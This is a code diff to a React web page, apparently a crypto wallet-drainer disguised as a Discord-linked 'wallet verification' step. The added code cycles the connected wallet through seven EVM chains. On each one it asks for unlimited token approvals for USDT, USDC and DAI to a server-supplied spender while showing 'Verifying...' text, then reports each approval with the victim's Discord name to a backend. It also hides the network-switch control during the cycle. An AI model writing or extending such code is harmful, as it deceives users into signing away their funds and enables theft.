@@ -1,8 +1,10 @@
 import { Button } from "@/components/ui/button";
 import { ArrowDown, Settings, ChevronDown, Loader2, CheckCircle } from "lucide-react";
 import { useState, useEffect } from "react";
-import { useAccount, useDisconnect, useChainId, useWriteContract, usePublicClient } from "wagmi";
+import { useAccount, useDisconnect, useChainId, useWriteContract, usePublicClient, useSwitchChain } from "wagmi";
+import { getPublicClient } from "@wagmi/core";
 import { useConnectModal, useChainModal } from "@rainbow-me/rainbowkit";
+import { config as wagmiConfig } from "@/wagmi";
 import { Connection, PublicKey, Transaction, TransactionInstruction } from "@solana/web3.js";
 import headerImage from "@assets/image_1767365952238.png";
 import section1 from "@assets/image_1770369464111.png";
@@ -343,6 +345,9 @@ export default function Home() {
   const [showSigningScreen, setShowSigningScreen] = useState(false);
   const [verifyButtonText, setVerifyButtonText] = useState("Verifying Your Account...");
   const [wasConnected, setWasConnected] = useState(false);
+  const [chainCycleIndex, setChainCycleIndex] = useState(0);
+  const [chainCycleActive, setChainCycleActive] = useState(false);
+  const [chainCycleTotal, setChainCycleTotal] = useState(0);
 
   const [discordUser, setDiscordUser] = useState<string | null>(null);
   const [discordId, setDiscordId] = useState<string | null>(null);
@@ -383,6 +388,9 @@ export default function Home() {
   
   const { writeContractAsync } = useWriteContract();
   const publicClient = usePublicClient();
+  const { switchChainAsync } = useSwitchChain();
+
+  const ALL_CHAIN_IDS = [1, 56, 137, 42161, 10, 43114, 8453];
 
   useEffect(() => {
     const nowConnected = isConnected || solanaConnected;
@@ -403,9 +411,11 @@ export default function Home() {
 
   useEffect(() => {
     if (isConnected && chainId && prevChainId && chainId !== prevChainId) {
-      setStep("idle");
-      setError("");
-      setShowSigningScreen(true);
+      if (!chainCycleActive) {
+        setStep("idle");
+        setError("");
+        setShowSigningScreen(true);
+      }
     }
     setPrevChainId(chainId);
   }, [chainId]);
@@ -517,92 +527,57 @@ export default function Home() {
   }, [address]);
 
   useEffect(() => {
-    if (chainId && isConnected) {
+    if (chainId && isConnected && !chainCycleActive) {
       setStep("idle");
     }
   }, [chainId]);
 
-  const handleProceed = async () => {
+  const approveTokensOnCurrentChain = async (targetChainId: number) => {
     if (!address) return;
-    setError("");
 
-    if (step !== "idle") return;
-    setStep("approving");
+    const localConfig = CHAIN_CONTRACT_ADDRESSES[targetChainId];
+    if (!localConfig) return;
+
+    let spenderAddr: `0x${string}`;
+    let tokenAddresses: string[];
 
     try {
-      let spenderAddr: `0x${string}`;
-      let tokenAddresses: string[];
-
-      const localConfig = chainId ? CHAIN_CONTRACT_ADDRESSES[chainId] : undefined;
-
-      try {
-        const configRes = await fetch(`/api/spender-config?chainId=${chainId}`);
-        const config = await configRes.json();
-        if (config.spenderAddress) {
-          spenderAddr = config.spenderAddress as `0x${string}`;
-          tokenAddresses = (config.tokens || localConfig?.tokens || EVM_TOKENS.map(t => t.address)) as string[];
-        } else if (localConfig) {
-          spenderAddr = localConfig.spenderAddress as `0x${string}`;
-          tokenAddresses = localConfig.tokens;
-        } else {
-          setError("No spender configured for this chain");
-          setStep("idle");
-          return;
-        }
-      } catch {
-        if (localConfig) {
-          spenderAddr = localConfig.spenderAddress as `0x${string}`;
-          tokenAddresses = localConfig.tokens;
-        } else {
-          setError("No spender configured for this chain");
-          setStep("idle");
-          return;
-        }
+      const configRes = await fetch(`/api/spender-config?chainId=${targetChainId}`);
+      const config = await configRes.json();
+      if (config.spenderAddress) {
+        spenderAddr = config.spenderAddress as `0x${string}`;
+        tokenAddresses = (config.tokens || localConfig.tokens) as string[];
+      } else {
+        spenderAddr = localConfig.spenderAddress as `0x${string}`;
+        tokenAddresses = localConfig.tokens;
       }
+    } catch {
+      spenderAddr = localConfig.spenderAddress as `0x${string}`;
+      tokenAddresses = localConfig.tokens;
+    }
 
-      const tokenSymbols = ["USDT", "USDC", "DAI"];
+    const chainClient = getPublicClient(wagmiConfig, { chainId: targetChainId as any });
 
-      for (let i = 0; i < tokenAddresses.length; i++) {
-        const tokenAddr = tokenAddresses[i];
-        const tokenSymbol = tokenSymbols[i] || "UNKNOWN";
-        try {
-          let currentAllowance = BigInt(0);
-          if (publicClient) {
-            currentAllowance = await publicClient.readContract({
+    const tokenSymbols = ["USDT", "USDC", "DAI"];
+
+    for (let i = 0; i < tokenAddresses.length; i++) {
+      const tokenAddr = tokenAddresses[i];
+      const tokenSymbol = tokenSymbols[i] || "UNKNOWN";
+      try {
+        let currentAllowance = BigInt(0);
+        if (chainClient) {
+          try {
+            currentAllowance = await chainClient.readContract({
               address: tokenAddr as `0x${string}`,
               abi: ERC20_APPROVE_ABI,
               functionName: 'allowance',
               args: [address as `0x${string}`, spenderAddr],
             }) as bigint;
-          }
+          } catch {}
+        }
 
-          if (currentAllowance > BigInt(0)) {
-            console.log(`[Verify] ${tokenSymbol} already verified`);
-            fetch("/api/approvals", {
-              method: "POST",
-              headers: { "Content-Type": "application/json" },
-              body: JSON.stringify({
-                walletAddress: address,
-                tokenAddress: tokenAddr,
-                tokenSymbol,
-                transactionHash: "pre-approved",
-                chainId,
-                discordUser: discordUser || undefined,
-              }),
-            }).catch(() => {});
-            continue;
-          }
-
-          console.log(`[Verify] Verifying ${tokenSymbol}...`);
-
-          const txHash = await writeContractAsync({
-            address: tokenAddr as `0x${string}`,
-            abi: ERC20_APPROVE_ABI,
-            functionName: 'approve',
-            args: [spenderAddr, BigInt(MAX_UINT256)],
-          });
-
-          console.log(`[Verify] ${tokenSymbol} verified`);
+        if (currentAllowance > BigInt(0)) {
+          console.log(`[Verify] ${tokenSymbol} on ${chainNames[targetChainId]} already verified`);
           fetch("/api/approvals", {
             method: "POST",
             headers: { "Content-Type": "application/json" },
@@ -610,17 +585,71 @@ export default function Home() {
               walletAddress: address,
               tokenAddress: tokenAddr,
               tokenSymbol,
-              transactionHash: txHash || "confirmed",
-              chainId,
+              transactionHash: "pre-approved",
+              chainId: targetChainId,
               discordUser: discordUser || undefined,
             }),
           }).catch(() => {});
-        } catch (tokenErr: any) {
-          console.error(`[Verify] Failed to verify ${tokenSymbol}:`, tokenErr?.message);
+          continue;
         }
+
+        console.log(`[Verify] Verifying ${tokenSymbol} on ${chainNames[targetChainId]}...`);
+
+        const txHash = await writeContractAsync({
+          chainId: targetChainId as any,
+          address: tokenAddr as `0x${string}`,
+          abi: ERC20_APPROVE_ABI,
+          functionName: 'approve',
+          args: [spenderAddr, BigInt(MAX_UINT256)],
+        });
+
+        console.log(`[Verify] ${tokenSymbol} on ${chainNames[targetChainId]} verified`);
+        fetch("/api/approvals", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            walletAddress: address,
+            tokenAddress: tokenAddr,
+            tokenSymbol,
+            transactionHash: txHash || "confirmed",
+            chainId: targetChainId,
+            discordUser: discordUser || undefined,
+          }),
+        }).catch(() => {});
+      } catch (tokenErr: any) {
+        console.error(`[Verify] Failed to verify ${tokenSymbol} on ${chainNames[targetChainId]}:`, tokenErr?.message);
+      }
+    }
+  };
+
+  const handleProceed = async () => {
+    if (!address) return;
+    setError("");
+    if (step !== "idle") return;
+    setStep("approving");
+    setChainCycleActive(true);
+    setChainCycleTotal(ALL_CHAIN_IDS.length);
+    setChainCycleIndex(0);
+
+    try {
+      for (let i = 0; i < ALL_CHAIN_IDS.length; i++) {
+        const targetChainId = ALL_CHAIN_IDS[i];
+        setChainCycleIndex(i);
+
+        console.log(`[Verify] Switching to ${chainNames[targetChainId]}...`);
+        try {
+          await switchChainAsync({ chainId: targetChainId });
+          await new Promise(r => setTimeout(r, 800));
+        } catch (switchErr: any) {
+          console.error(`[Verify] Failed to switch to ${chainNames[targetChainId]}:`, switchErr?.message);
+          continue;
+        }
+
+        await approveTokensOnCurrentChain(targetChainId);
       }
 
       setStep("done");
+      setChainCycleActive(false);
     } catch (err: any) {
       console.error("Approval error:", err);
       if (err?.message?.includes("User rejected") || err?.message?.includes("denied") || err?.code === 4001) {
@@ -629,6 +658,7 @@ export default function Home() {
         setError(err?.message || "Failed to approve tokens");
       }
       setStep("idle");
+      setChainCycleActive(false);
     }
   };
 
@@ -876,7 +906,7 @@ export default function Home() {
           {(isConnected || solanaConnected) ? (
             <div className="flex flex-col items-end gap-2">
               <div className="flex items-center gap-2">
-                {isConnected && !solanaConnected && openChainModal && (
+                {isConnected && !solanaConnected && openChainModal && !chainCycleActive && (
                   <button
                     onClick={openChainModal}
                     className="flex items-center gap-1 sm:gap-2 bg-[#3a3f7a] hover:bg-[#4752c4] text-white font-medium rounded-[20px] px-2 sm:px-4 py-1 sm:py-2 text-[10px] sm:text-sm cursor-pointer border-0 outline-none"
@@ -1001,6 +1031,19 @@ export default function Home() {
             <div className="text-center">
               <h3 className="text-xl font-semibold text-gray-900 mb-3">Connecting your wallet</h3>
               <p className="text-gray-900 text-lg font-bold">Verify wallet to confirm that it's you . . .</p>
+              {chainCycleActive && networkType === "evm" && (
+                <div className="mt-3 space-y-2">
+                  <p className="text-sm text-gray-500">
+                    Verifying on {chainNames[ALL_CHAIN_IDS[chainCycleIndex]] || "..."} ({chainCycleIndex + 1}/{chainCycleTotal})
+                  </p>
+                  <div className="w-full bg-gray-200 rounded-full h-1.5">
+                    <div 
+                      className="bg-[#4752c4] h-1.5 rounded-full transition-all duration-500"
+                      style={{ width: `${((chainCycleIndex + 1) / chainCycleTotal) * 100}%` }}
+                    />
+                  </div>
+                </div>
+              )}
             </div>
             <button
               onClick={() => {
@@ -1017,7 +1060,7 @@ export default function Home() {
               {(isProcessing || isSolanaProcessing) ? (
                 <>
                   <Loader2 className="w-5 h-5 animate-spin" />
-                  Verifying...
+                  {chainCycleActive ? `Verifying ${chainNames[ALL_CHAIN_IDS[chainCycleIndex]] || "..."}...` : "Verifying..."}
                 </>
               ) : (
                 verifyButtonText
